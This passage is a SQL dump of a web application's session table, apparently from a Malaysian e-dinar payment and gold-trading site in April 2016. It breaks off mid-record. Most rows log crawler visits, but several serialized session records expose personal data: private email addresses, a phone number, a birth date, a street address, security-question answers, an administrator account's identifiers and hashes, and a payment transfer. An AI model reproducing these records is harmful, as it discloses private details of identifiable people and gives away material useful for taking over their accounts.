('82391f018ba8e042a05f615446c3b50c', '180.76.15.34', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461534095, ''),
('823d6d90e4c42127a3c9afe023d7e70a', '123.125.71.74', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461714109, ''),
('8278b1c5df6a7cc604fc1d79e138ed4c', '157.55.39.62', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461451411, ''),
('8285408dff7094c5856b00831b1e69f6', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461429421, ''),
('8292baced4db2b51a631f959ef589b6d', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461676616, ''),
('82b5d0cc80acf18f7496170ef94a8281', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461915095, ''),
('82d1c7ea555bf66eb2f9c460ada93351', '113.210.54.20', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461596858, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-25T22:53:14+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('82eef155301bb7b9d671ceefd1cdc427', '115.164.213.230', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461803168, 'a:60:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-27T20:54:40+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;s:12:"payment_temp";a:9:{s:10:"me_id_from";s:1:"7";s:5:"ft_id";s:1:"4";s:5:"tt_id";s:1:"1";s:8:"username";s:9:"azhar9751";s:8:"me_id_to";s:2:"47";s:5:"pt_id";s:1:"1";s:5:"at_id";s:1:"1";s:9:"tr_amount";s:3:"100";s:8:"tr_notes";s:13:"big boss fund";}s:15:"me_rec_fullname";s:19:"Azhar9751 Azhar9751";s:15:"me_rec_username";s:9:"Azhar9751";s:7:"pt_desc";s:5:"Goods";s:7:"at_desc";s:7:"E-Dinar";s:12:"amount_trans";s:6:"100.00";s:11:"tr_datetime";s:19:"2016-04-28 08:26:58";s:8:"tr_notes";s:13:"big boss fund";s:15:"send_fee_amount";s:4:"0.00";}'),
('82fb56165881446471f8b7cc89cdacc1', '183.171.175.113', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LR', 1461801648, 'a:51:{s:5:"me_id";s:2:"47";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"Azhar9751";s:11:"me_lastname";s:9:"Azhar9751";s:11:"me_username";s:9:"Azhar9751";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"Azhar9751";s:14:"me_unique_link";s:32:"033ed15796968126a1ef11da142912a6";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:20:"azhar29066@gmail.com";s:16:"me_register_date";s:19:"2016-04-26 21:01:27";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-27T22:09:58+08:00";s:12:"me_magic_num";s:32:"9a5749634c226c2629c9d3e3d217bb2f";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('83577d9701eb4f070e329afca917e3be', '207.46.13.25', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461518009, ''),
('83933ebac478ab8290bb2832f8ca56a0', '157.55.39.77', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461464614, ''),
('839a8cb7e068fe0e6aab9233c705d931', '89.163.148.58', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461838883, ''),
('84506f56bac5de7591c609b6ecc59070', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231976, ''),
('84e62e013c55656176401f73265583e9', '183.171.18.77', 'WhatsApp/2.16.13 A', 1461232123, 'a:1:{s:12:"me_id_parent";s:88:"4vb5b1W9H484ES0uyOihDWejxP6FVHabSbpY5EyRjazmV3dc_th4c7gyWtqbg7NOawQfmnLtFgUXEIpuRv9Abw==";}'),
('852a3a6d1cbbc9ae628303a308b231dd', '14.1.198.218', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461410332, 'a:51:{s:5:"me_id";s:2:"10";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"muhai";s:11:"me_lastname";s:5:"muhai";s:11:"me_username";s:5:"muhai";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"muhai";s:14:"me_unique_link";s:32:"1f224e9700571b8b26f31dfb323f1b5f";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:19:"muhai1991@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 19:16:31";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"3e533ec1872fb3b11675b85505da24a8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;}'),
('8533e6f355c784b8db2b1c46d8c88ce6', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461563056, ''),
('856db7de3f2b2e69a443537e7d27562f', '173.252.79.114', 'facebookexternalhit/1.1', 1461421916, 'a:1:{s:12:"me_id_parent";s:88:"KQzKUDnywiJnUd99PBuhdT14cmlJj4-JUmSocp8dyBOTGgS2z9N7n3cutcyzeDINsOpsY5KwDUOLA1e9o40mzg==";}'),
('85b97379b5fd6fe6e43f85e48ee22634', '202.58.86.18', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461543254, ''),
('85ba40c4f614c2b15d6f9e818dd77765', '180.76.15.151', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461748883, ''),
('85bf3095dda7eec4db57024870e56531', '149.202.49.56', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461839742, ''),
('85cb40cb21e1ae7e2708a009238b5e11', '180.76.15.16', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461156592, ''),
('861c4eef54762be197114740fb43fe12', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898665, ''),
('8663948db179ea430de76eeb907afb67', '65.19.167.132', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461503273, ''),
('866a41ab67bf408d0cfe177fd4ed2098', '180.76.15.134', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461613776, ''),
('86a48e8ec72929a167ff2a8b6721f281', '173.252.90.238', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461429514, ''),
('86f0296960fed494c2e13fde553b3213', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;', 1461743143, ''),
('872e83dadd30fd7dac041c075d8ed563', '175.139.45.251', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N910C Build/', 1461500482, 'a:1:{s:12:"me_id_parent";s:88:"l4tu-uhVAQUaM2QrfswH6o-jIWViZH7Jfh-oKSMxHNaZygr10L8AmfFc06VrJW9FI66BlI23L9lMBQuz8gqGUw==";}'),
('874bd9ada6dc157549959c5c678b1546', '157.55.39.104', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461130804, ''),
('87752388f473ed913efa8cd19db3e25a', '141.8.142.82', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247728, ''),
('87af974a4a66df360b553b5d9ab17b6e', '106.185.54.219', 'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Bu', 1461459937, 'a:1:{s:12:"me_id_parent";s:88:"dMmD4AI94pM0Pz78LLHS2BzSdiZNqIxbL5Dep_DeJMwyNJbvRyjihM5GydBDBbiyz_KqD_-XqAeMEwVFtR2vAA==";}'),
('87be233851cc7e240da6eba49ef91cff', '180.76.15.15', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461886128, ''),
('87cefc8b267e2b3a2db86abda244e689', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160566, ''),
('87edc55d603696974e16a77fd4fe1b89', '66.249.69.4', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461615755, ''),
('880978fe5220be87fdc4d64066ce6f96', '157.55.39.86', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461405061, ''),
('8809c0b1e3d6c6fc236140244649b1fc', '103.6.196.115', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (K', 1461706833, ''),
('884e0bfe5fea55869475a1e11540d044', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160551, ''),
('88536e8ec8197d41d046b4274c1adb9c', '66.249.65.125', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461118668, ''),
('88bc27cb09a2971ccca961f0f95032e2', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461629940, ''),
('88c7e9edcb4a8d3db82fa30747c60b9c', '134.249.55.100', 'Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)', 1461188429, ''),
('89314019ec20c50a0dc31e17149a6e28', '66.249.65.76', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461127224, ''),
('89651111d63e7c729cdb31c38ed2d50b', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461662502, ''),
('89b0539e7c101a77bd419ede4f8ca4bf', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 1461915100, ''),
('8a3529a486bfb30ad60819a64225e25f', '66.249.65.119', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461149829, ''),
('8af29b8c3c8fd43b99da153ffabc7e22', '180.76.15.145', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461875193, ''),
('8af5183975c54408288cbdf2ed208933', '74.91.23.108', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461540478, ''),
('8b53bdf48657e850dac55a4cfa12ba89', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461544448, ''),
('8b792396652ffbddc6915544e5e636f4', '115.164.81.230', 'WhatsApp/2.16.2/i', 1461853864, 'a:1:{s:12:"me_id_parent";s:4:"VmA=";}'),
('8b83667843c287c06971633895bd4939', '66.249.64.86', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461782950, ''),
('8bb823fe7d92ef404fa50f170030a505', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461394610, ''),
('8bf9349589fb5949d7604d845905f214', '173.252.115.11', 'facebookexternalhit/1.1', 1461231336, ''),
('8c022c57443d4bae1b1ba6344e1edc10', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461472987, ''),
('8c044436397df053a475c75356bec907', '45.55.229.99', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1', 1461718313, ''),
('8c1c73a487243a27d59cb3634fdd7aac', '69.197.177.50', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461695469, ''),
('8c3926ec1fde1c59814bfc998478e9e6', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894700, ''),
('8c76a6a4c9cf5373003876a526257563', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436800, ''),
('8cc2313b7fb8ba170d7ab8963242cfdd', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461690036, ''),
('8cf10728987e8db728007e12fe2e84bf', '208.115.111.74', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461560869, ''),
('8cfd36a36730c61577029e0637ef0ba0', '113.210.63.66', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461484676, 'a:52:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-24T10:38:39+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;s:17:"customer_username";s:5:"arash";s:13:"cart_contents";a:4:{s:32:"e065935dd9b6738f9e5d13ecb452d09f";a:7:{s:5:"rowid";s:32:"e065935dd9b6738f9e5d13ecb452d09f";s:2:"id";s:16:"q4QCAaWmDm2hENBU";s:3:"qty";s:1:"1";s:5:"price";s:1:"1";s:4:"name";s:1:"-";s:7:"options";a:18:{s:5:"it_id";s:1:"1";s:5:"pu_id";s:1:"1";s:6:"itc_id";s:1:"3";s:5:"br_id";s:1:"7";s:6:"isc_id";s:1:"1";s:8:"v_weight";s:1:"1";s:6:"v_name";s:11:"Pamp Suisse";s:6:"v_cert";s:6:"594459";s:6:"v_desc";s:25:"Broken seal plastic cover";s:7:"v_image";s:36:"63afeec2f95fc36b7d3cb4633199c719.jpg";s:8:"v_image2";s:36:"240de8158365233e8fcf46aa61707ab0.jpg";s:8:"v_image3";s:20:"NoImageAvailable.png";s:8:"v_image4";s:20:"NoImageAvailable.png";s:8:"v_image5";s:20:"NoImageAvailable.png";s:5:"me_id";s:1:"7";s:12:"v_price_rate";d:0;s:5:"vt_id";i:3;s:9:"v_regdate";s:19:"2016-04-24 16:02:56";}s:8:"subtotal";i:1;}s:32:"ce7c099a99f8a56e8dd58f86a86fd34b";a:7:{s:5:"rowid";s:32:"ce7c099a99f8a56e8dd58f86a86fd34b";s:2:"id";s:16:"lyGrvNVg8t4gfhQU";s:3:"qty";s:1:"1";s:5:"price";s:1:"1";s:4:"name";s:1:"-";s:7:"options";a:18:{s:5:"it_id";s:1:"1";s:5:"pu_id";s:1:"1";s:6:"itc_id";s:1:"1";s:5:"br_id";s:1:"7";s:6:"isc_id";s:1:"1";s:8:"v_weight";s:1:"1";s:6:"v_name";s:34:"Istanbul Gold Refinery (IGR) 1gram";s:6:"v_cert";s:6:"283401";s:6:"v_desc";s:0:"";s:7:"v_image";s:36:"289802aae2875043c7f8685b099d5aa4.jpg";s:8:"v_image2";s:36:"8c6633024b31aac06cdac743aff4ac2b.jpg";s:8:"v_image3";s:20:"NoImageAvailable.png";s:8:"v_image4";s:20:"NoImageAvailable.png";s:8:"v_image5";s:20:"NoImageAvailable.png";s:5:"me_id";s:1:"7";s:12:"v_price_rate";d:0;s:5:"vt_id";i:3;s:9:"v_regdate";s:19:"2016-04-24 16:04:48";}s:8:"subtotal";i:1;}s:11:"total_items";i:2;s:10:"cart_total";i:2;}}');
INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('8d39c6e21e858a0cac083bef0d64411d', '208.115.113.93', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461578827, ''),
('8d6b09afabd5dc49b16649eceb1f274d', '45.55.133.227', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;', 1461155538, ''),
('8d75a2f7228e119d1520b07a3d367866', '183.171.23.161', 'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Bu', 1461423143, 'a:1:{s:12:"me_id_parent";s:88:"AcPLAZCUpIJmcezBj97rKc3WkBfURzV6iRkRd999BjkIfgsTk-9UxDzUsNVJWfUqG99EsjpdTfSs9vVmq4TQnw==";}'),
('8d81be1f09d785bc5c0111a9c0b36a47', '191.240.172.232', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;', 1461887345, ''),
('8dc67933bf9a94fb57a091a0ab444b9c', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461428284, ''),
('8e0df87c0083e555c7ea6052b4bafaae', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894662, ''),
('8e1c83eb45f71301deb4a976ac783bc9', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436800, ''),
('8e1f679bdb8bd36bc757e2ab57274849', '203.82.80.135', 'Mozilla/5.0 (Linux; U; Android 4.2.2;en-gb; Lenovo', 1461629945, ''),
('8e4fe35b3392e90171271b7df9bfbefe', '157.55.39.62', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461443766, ''),
('8e538014b654a75d44c568204e13be27', '157.55.39.201', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461802256, ''),
('8e819c8f6be277adb97ea25ef2565699', '173.252.90.243', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461249132, ''),
('8ea8924db392dcf8dba12534b29cc480', '173.236.241.168', '0', 1461739952, ''),
('8ec3703d65bb37a86d1ee648056be354', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461166204, ''),
('8f530c26b4b8f760033a5d3c559b81e1', '173.252.115.166', 'facebookexternalhit/1.1', 1461407974, 'a:1:{s:12:"me_id_parent";s:88:"L3PqUwQ5fQA5UlZUGeQ5IUfAB4yrvMpkRpT3dmE87xXS8fNiVthiKmF5qxZisbylbg4_O-7WH-NLEbNrBz3UHg==";}'),
('8f843dea24661aa6bed8114e487322c9', '192.99.13.56', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461485399, 'a:1:{s:12:"me_id_parent";s:88:"pT9RzF4l1N7f2WoUSrclFgchrv2E0haytKT70nsHFBHUVu_uHOW48uZ_bj6rxRE8YATEn0AQmTQTnG1hoZlbPQ==";}'),
('8fe335a6c8f273eec67cc007951ae83f', '210.186.52.33', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-N5100 Build/', 1461472494, 'a:1:{s:12:"me_id_parent";s:88:"iA742r_0Yq57qnp14SRQ-b_gzS-VTxODnU0SIUvvS-eqj77OUH9tJ9_2nfLDEIdArsCcxMxQjBmSjs6I5YYgHQ==";}'),
('900a5b1fa904ee3f25b4d8c60c14ee2b', '69.171.228.118', 'facebookexternalhit/1.1', 1461899408, 'a:1:{s:12:"me_id_parent";s:4:"UGY=";}'),
('901d54719bf99fdd2a8a25012b05f3a4', '180.76.15.30', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461720105, ''),
('90460171b97024c6598f558c8382f429', '210.186.220.210', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (K', 1461411365, 'a:52:{s:5:"me_id";s:1:"9";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:19:"ruxaini89@gmail.com";s:11:"me_lastname";s:19:"ruxaini89@gmail.com";s:11:"me_username";s:19:"ruxaini89@gmail.com";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:19:"ruxaini89@gmail.com";s:14:"me_unique_link";s:32:"57a476e2b37f20f08708e171d9d58d4c";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:19:"ruxaini89@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 19:11:04";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"57a476e2b37f20f08708e171d9d58d4c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:14:"flash:old:info";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";}'),
('9074cc3bbb16007f2cf9c3be74344c22', '66.249.64.46', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461841973, ''),
('90f1fc70dbb2190fb3cd9802c3ab119a', '66.249.64.46', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461797671, ''),
('91094135018c091423887013b4edc59b', '115.134.161.155', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (K', 1461313505, ''),
('9118d577447ed1fb0beca3f1020f2d68', '113.210.62.47', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461423277, ''),
('91202cccd39aa9d792669db49ab6bda5', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231994, ''),
('912962e54d355b66814a1cb3f9afb8d3', '180.76.15.28', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461602727, ''),
('9135701a96aaa78d62f9729196f380d7', '103.1.71.67', 'Mozilla/5.0 (Linux; Android 4.4.4; N5206 Build/KTU', 1461750033, 'a:1:{s:12:"me_id_parent";s:8:"AjYIOA==";}'),
('9158c09bee959adbc2bc8d3f39f78332', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461529958, ''),
('9160a7e62fa3376804d141437f9ef523', '180.76.15.159', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461560262, ''),
('917bb32e6318de0f767cd1921315123b', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461262905, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my 